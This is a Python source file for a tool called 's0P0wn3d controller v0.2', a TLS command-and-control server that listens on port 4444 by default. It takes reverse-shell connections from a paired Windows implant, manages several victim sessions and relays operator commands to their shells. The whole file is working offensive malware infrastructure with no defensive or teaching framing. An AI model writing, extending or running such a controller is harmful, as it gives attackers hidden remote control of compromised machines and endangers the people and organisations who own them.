#!/usr/bin/env python3
"""
s0P0wn3d controller - v0.2

TLS listener with length-prefixed framing and multi-session management.
Pairs with implant v0.2 (SChannel + pinned server certificate).

Protocol: each message is a 4-byte big-endian length followed by that many
bytes of payload. Payloads are shell data in v0.2; typed messages (file
transfer, commands) layer on the same framing later.

Trust model: the implant pins the controller certificate's SHA-256
(implant/cert_pin.h, generated by tools/make_certs.sh). The controller does
not authenticate implants yet - anyone with network reach can open a
session. Documented weakness, fixed with client certs or a PSK handshake.

Stdlib only. Usage:
  python s0p0wn3d.py [--host 0.0.0.0] [--port 4444]
                     [--cert certs/server.crt] [--key certs/server.key]
"""

import argparse
import socket
import ssl
import struct
import sys
import threading

MAX_FRAME = 1 << 20  # 1 MiB frame cap: anything larger is a bug or an attack


def recv_all(conn: ssl.SSLSocket, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed")
        buf += chunk
    return bytes(buf)


def recv_frame(conn: ssl.SSLSocket) -> bytes:
    (length,) = struct.unpack("!I", recv_all(conn, 4))
    if length > MAX_FRAME:
        raise ConnectionError("oversized frame")
    return recv_all(conn, length)


def send_frame(conn: ssl.SSLSocket, payload: bytes) -> None:
    conn.sendall(struct.pack("!I", len(payload)) + payload)


class Session:
    """One connected implant. A reader thread receives output; it goes to
    the operator live when attached, into a backlog otherwise."""

    def __init__(self, sid: int, conn: ssl.SSLSocket, addr: tuple, lock: threading.Lock):
        self.sid = sid
        self.conn = conn
        self.addr = addr
        self.lock = lock  # guards prints shared with the REPL
        self.attached = False
        self.alive = True
        self.backlog = []
        self.reader = threading.Thread(target=self._recv_loop, daemon=True)
        self.reader.start()

    def _recv_loop(self) -> None:
        try:
            while True:
                data = recv_frame(self.conn)
                text = data.decode(errors="replace")
                with self.lock:
                    if self.attached:
                        sys.stdout.write("\r" + text)
                    else:
                        self.backlog.append(text)
                    sys.stdout.flush()
        except (ConnectionError, ssl.SSLError, OSError):
            self.alive = False
            with self.lock:
                if self.attached:
                    print(f"\r[-] session {self.sid} lost")
                else:
                    self.backlog.append(f"\n[-] session {self.sid} lost\n")

    def attach(self) -> None:
        self.attached = True
        with self.lock:
            for chunk in self.backlog:
                sys.stdout.write(chunk)
            self.backlog.clear()
            sys.stdout.flush()

    def detach(self) -> None:
        self.attached = False

    def close(self) -> None:
        self.alive = False
        try:
            self.conn.close()
        except OSError:
            pass


class Controller:
    def __init__(self):
        self.sessions = {}
        self.next_sid = 1
        self.lock = threading.Lock()
        self.attached_sid = None

    def add(self, conn: ssl.SSLSocket, addr: tuple) -> None:
        with self.lock:
            sid = self.next_sid
            self.next_sid += 1
            self.sessions[sid] = Session(sid, conn, addr, self.lock)
        print(f"\r[+] session {sid} from {addr[0]}:{addr[1]}")

    def repl(self) -> None:
        while True:
            try:
                line = input(self._prompt())
            except (EOFError, KeyboardInterrupt):
                print()
                line = "exit"

            if self.attached_sid is None:
                if not self._command(line.strip()):
                    break
            else:
                session = self.sessions.get(self.attached_sid)
                if line.strip() == "back":
                    session.detach()
                    self.attached_sid = None
                elif session is None or not session.alive:
                    print("[-] session is gone")
                    self.attached_sid = None
                else:
                    send_frame(session.conn, line.encode() + b"\r\n")

    def _prompt(self) -> str:
        if self.attached_sid is None:
            return "s0p0wn3d> "
        return ""

    def _command(self, cmd: str) -> bool:
        """Handle a top-level REPL command. Returns False to quit."""
        if cmd in ("exit", "quit"):
            for s in self.sessions.values():
                s.close()
            return False
        if cmd == "sessions":
            for sid, s in self.sessions.items():
                state = "alive" if s.alive else "dead"
                pending = f", {len(s.backlog)} buffered" if s.backlog else ""
                print(f"  {sid}: {s.addr[0]}:{s.addr[1]} ({state}{pending})")
            return True
        if cmd.startswith("use "):
            try:
                sid = int(cmd.split()[1])
            except (IndexError, ValueError):
                print("usage: use <id>")
                return True
            session = self.sessions.get(sid)
            if session is None:
                print(f"[-] no session {sid}")
            else:
                self.attached_sid = sid
                session.attach()
                print(f"[*] attached to session {sid} - 'back' to detach")
            return True
        if cmd.startswith("kill "):
            try:
                sid = int(cmd.split()[1])
            except (IndexError, ValueError):
                print("usage: kill <id>")
                return True
            session = self.sessions.get(sid)
            if session is None:
                print(f"[-] no session {sid}")
            else:
                session.close()
                print(f"[*] session {sid} closed")
            return True
        if cmd == "help":
            print("commands: sessions | use <id> | back | kill <id> | exit")
            return True
        if cmd:
            print("unknown command - 'help'")
        return True


def main() -> None:
    parser = argparse.ArgumentParser(description="s0P0wn3d controller v0.2")
    parser.add_argument("--host", default="0.0.0.0", help="listen address")
    parser.add_argument("--port", type=int, default=4444, help="listen port")
    parser.add_argument("--cert", default="certs/server.crt", help="TLS certificate")
    parser.add_argument("--key", default="certs/server.key", help="TLS private key")
    args = parser.parse_args()

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(args.cert, args.key)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    # SChannel reports TLS 1.3 NewSessionTicket as SEC_I_RENEGOTIATE, which
    # the implant refuses by design. Suppress tickets on the server side.
    ctx.options |= getattr(ssl, "OP_NO_TICKET", 0)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen(16)

    controller = Controller()

    def accept_loop():
        while True:
            try:
                raw, addr = listener.accept()
            except OSError:
                return  # listener closed on shutdown
            try:
                conn = ctx.wrap_socket(raw, server_side=True)
            except ssl.SSLError:
                raw.close()
                continue
            controller.add(conn, addr)

    threading.Thread(target=accept_loop, daemon=True).start()
    print(f"[*] s0P0wn3d v0.2 listening on {args.host}:{args.port} (TLS)")
    print("[*] 'help' for commands")

    try:
        controller.repl()
    finally:
        listener.close()
    print("[*] shut down")


if __name__ == "__main__":
    main()
